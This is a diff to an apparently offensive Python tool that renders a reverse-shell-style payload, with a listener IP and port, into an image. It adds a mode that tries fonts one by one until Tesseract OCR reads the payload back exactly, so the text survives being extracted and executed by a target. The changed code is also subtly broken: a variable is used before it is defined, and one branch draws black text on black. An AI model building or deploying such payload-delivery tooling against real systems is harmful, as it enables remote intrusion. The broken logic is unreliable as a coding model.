@@ -2,6 +2,7 @@
 import os
 import argparse
 import base64
+import pytesseract
 from PIL import Image, ImageDraw, ImageFont
 
 
@@ -60,6 +61,9 @@ parser.add_argument('-pf','--payload', help=bcolors.GREEN +'text file'+bcolors.E
 # font choice
 parser.add_argument("-fo", "--font", help=bcolors.GREEN +'Font'+bcolors.ENDC+" to be used for the text in the image (default: Courier)")
 
+# I got tired of trying again and again so I wrote a script to automate the trial and error process
+parser.add_argument("-fl", "--fontlist", help=bcolors.GREEN +'Font list file'+bcolors.ENDC+", the fonts will be tried one by one until the string is correctly understood by tesseract (default: Courier)" )
+
 def Parse_args():
     # let's get all the arguments
     args = vars(parser.parse_args())
@@ -83,16 +87,44 @@ def Parse_args():
     else:
         b64_bool = False
 
-    if args["font"]:
+    if args["fontlist"]:
+        isfontaList = True
+        font_choice = args["fontlist"]
+
+    elif args["font"]:
         font_choice = args["font"]
     else:
         font_choice = "arial"
 
-    return IP, Port, OutputFileName, payload_file, listener, font_choice, b64_bool
+    return IP, Port, OutputFileName, payload_file, listener, font_choice, b64_bool, isfontaList
+
+def Generate_image(payload, listener, IP, Port, b64_bool,font):
+        if b64_bool:
+            img = Image.new('RGB', (len(b64_payload) * 60, 200), color = 'black')
+            str_convert = "{}".format(b64_payload,).replace('\'b\'','\'').replace('sh\'\'','sh\'')
+            draw = ImageDraw.Draw(img)
+            font = ImageFont.truetype("{}.ttf".format(font), 40)
+            draw.text((0, 0),b64_payload.decode(),(0,0,0),font=font)
+            img.save('payload.jpg')
+        else:
+            img = Image.new('RGB', (len(payload) * 30, 75), color = 'white')
+            draw = ImageDraw.Draw(img)
+            try:
+                font = ImageFont.truetype("{}.ttf".format(font), 40)
+            except:
+                try:
+                    font = ImageFont.truetype("{}.t1".format(font), 40)
+                except:
+                    try:
+                        font = ImageFont.truetype("{}.otf".format(font), 40)
+                    except:
+                        return
+            draw.text((0, 3),payload,(0,0,0),font=font, stroke_width=2)
+            img.save('payload.jpg')
 
 if __name__ =="__main__":
     print(header)
-    IP, Port, OutputFileName, payload_file, Listener, font, b64_bool = Parse_args()
+    IP, Port, OutputFileName, payload_file, Listener, font, b64_bool, isfontaList = Parse_args()
 
     print_with_colors("Current configuration\n=====================================", bcolors.GREEN)
     print(bcolors.GREEN + "[+] listener ip: {}".format(bcolors.WARNING+IP+bcolors.ENDC) +bcolors.ENDC)
@@ -112,16 +144,25 @@ if __name__ =="__main__":
             print_with_colors("\n---> encoded payload: ", bcolors.CYAN)
             print(bcolors.WARNING + b64_payload.decode() + bcolors.ENDC)
 
-    if b64_bool:
-        img = Image.new('RGB', (len(b64_payload) * 60, 200), color = 'black')
-        str_convert = "{}".format(b64_payload,).replace('\'b\'','\'').replace('sh\'\'','sh\'')
-        draw = ImageDraw.Draw(img)
-        font = ImageFont.truetype("{}.ttf".format(font), 80)
-        draw.text((0, 0),b64_payload.decode(),(255,255,255),font=font)
-        img.save('payload.jpg')
+    if isfontaList:
+        with open(font) as FF:
+            i = 0.0
+            lines = FF.readlines()
+            for line in lines:
+                font = line.strip()
+                Generate_image(payload, Listener, IP, Port, b64_bool, font)
+                interpreted_payload = pytesseract.image_to_string(Image.open('payload.jpg'))
+                interpreted_payload = interpreted_payload.strip().replace("\n","")
+                try:
+                    list = [bcolors.GREEN + interpreted_payload[i] +bcolors.ENDC if interpreted_payload[i]==payload[i] else bcolors.BLUE + interpreted_payload[i] + bcolors.ENDC for i in range(len(interpreted_payload))]
+                except:
+                    pass
+                print("[+] calibration: {:.2f}%, {}                                                   ".strip().format(100*i/len(lines),''.join(list)), end='\r')
+                if interpreted_payload == payload:
+                    print("[+] calibration: {:.2f}%, {}                                                   ".strip().format(100*i/len(lines),''.join(list)))
+                    print("Found a match with font: {}".format(line))
+                    quit()
+                i+=1
+
     else:
-        img = Image.new('RGB', (len(payload) * 60, 200), color = 'black')
-        draw = ImageDraw.Draw(img)
-        font = ImageFont.truetype("{}.ttf".format(font), 80)
-        draw.text((0, 0),payload,(255,255,255),font=font)
-        img.save('payload.jpg')
+        Generate_image(payload, Listener, IP, Port, b64_bool, font)
